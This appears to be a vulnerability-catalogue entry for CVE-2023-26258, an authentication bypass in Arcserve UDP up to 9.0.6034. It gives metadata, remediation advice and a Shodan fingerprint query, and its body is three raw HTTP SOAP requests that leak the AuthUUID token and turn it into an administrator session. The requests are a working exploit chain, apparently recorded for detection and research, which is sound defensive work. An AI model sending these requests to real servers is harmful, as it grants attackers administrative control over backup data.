_cves/2023/cve-2023-26258.md

---
layout: "post"
cve_id: "CVE-2023-26258"
title: "Arcserve UDP <= 9.0.6034 - Authentication Bypass"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-26258.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-26258.yaml"
author: "daffainfo"
severity: "critical"
impact: "Unauthenticated attackers can bypass authentication by leaking the AuthUUID token, allowing them to execute any administrative task and potentially compromise all backup data managed by Arcserve UDP.
"
remediation: "Upgrade to Arcserve UDP version 9.1 or later that addresses this authentication bypass vulnerability.
"
reference:
  - "https://www.mdsec.co.uk/2023/06/cve-2023-26258-remote-code-execution-in-arcserve-udp-backup/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-26258"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2023-26258', 'epss-score': 0.73541, 'epss-percentile': 0.9876, 'cwe-id': 'CWE-863', 'cpe': 'cpe:2.3:a:arcserve:udp:*:*:*:*:*:*:*:*'}"
metadata: "{'verified': True, 'max-request': 3, 'vendor': 'arcserve', 'product': 'udp', 'shodan-query': 'http.favicon.hash:-1889244460'}"
tags:
  - "cve"
  - "cve2023"
  - "arcserve"
  - "auth-bypass"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
Arcserve UDP through 9.0.6034 allows authentication bypass. The method getVersionInfo at WebServiceImpl/services/FlashServiceImpl leaks the AuthUUID token. This token can be used at /WebServiceImpl/services/VirtualStandbyServiceImpl to obtain a valid session. This session can be used to execute any task as administrator.


## ðŸŒ HTTP Request
```nohighlight
POST /WebServiceImpl/services/FlashServiceImpl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Connection: close
Content-Length: 1013
Content-Type: text/xml
Accept-Encoding: gzip

<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Body>
    <ns2:getVersionInfo
        xmlns:ns2="http://webservice.arcflash.ca.com"
        xmlns:ns3="http://backup.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns4="http://data.webservice.arcflash.ca.com/xsd"
        xmlns:ns5="http://export.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns6="http://vsphere.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns7="http://browse.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns8="http://restore.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns9="http://catalog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns10="http://activitylog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns11="http://remotedeploy.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns12="http://history.job.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns13="http://webservice.edge.arcserve.ca.com/"/>
  </S:Body>
</S:Envelope>
```

```nohighlight
POST /WebServiceImpl/services/VirtualStandbyServiceImpl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/3.6.12
Connection: close
Content-Length: 1076
Content-Type: text/xml
SOAPAction: "<http://webservice.arcflash.ca.com/IEdgeDashboardService/validateUserByUUIDRequest>"
Accept-Encoding: gzip

<?xml version="1.0" encoding="UTF-8"?>
<S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
  <S:Body>
    <ns2:validateUserByUUID
        xmlns:ns2="http://webservice.arcflash.ca.com"
        xmlns:ns3="http://backup.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns4="http://data.webservice.arcflash.ca.com/xsd"
        xmlns:ns5="http://export.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns6="http://vsphere.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns7="http://browse.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns8="http://restore.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns9="http://catalog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns10="http://activitylog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns11="http://remotedeploy.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns12="http://history.job.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns13="http://webservice.edge.arcserve.ca.com/">
        <arg0>riv63w</arg0>
    </ns2:validateUserByUUID>
  </S:Body>
</S:Envelope>
```

```nohighlight
POST /WebServiceImpl/services/FlashServiceImpl HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Connection: close
Content-Length: 1069
Content-Type: text/xml
SOAPAction: "<http://webservice.arcflash.ca.com/IFlashService_R16_5/getVersionInfoRequest>"
Accept-Encoding: gzip

<?xml version="1.0" encoding="UTF-8"?>
  <S:Envelope xmlns:S="http://schemas.xmlsoap.org/soap/envelope/">
    <S:Body>
      <ns2:getLocalHostAsTrust
        xmlns:ns2="http://webservice.arcflash.ca.com"
        xmlns:ns3="http://backup.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns4="http://data.webservice.arcflash.ca.com/xsd"
        xmlns:ns5="http://export.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns6="http://vsphere.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns7="http://browse.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns8="http://restore.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns9="http://catalog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns10="http://activitylog.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns11="http://remotedeploy.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns12="http://history.job.data.webservice.arcflash.ca.com/xsd"
        xmlns:ns13="http://webservice.edge.arcserve.ca.com/"
      >
      </ns2:getLocalHostAsTrust>
    </S:Body>
  </S:Envelope>
```

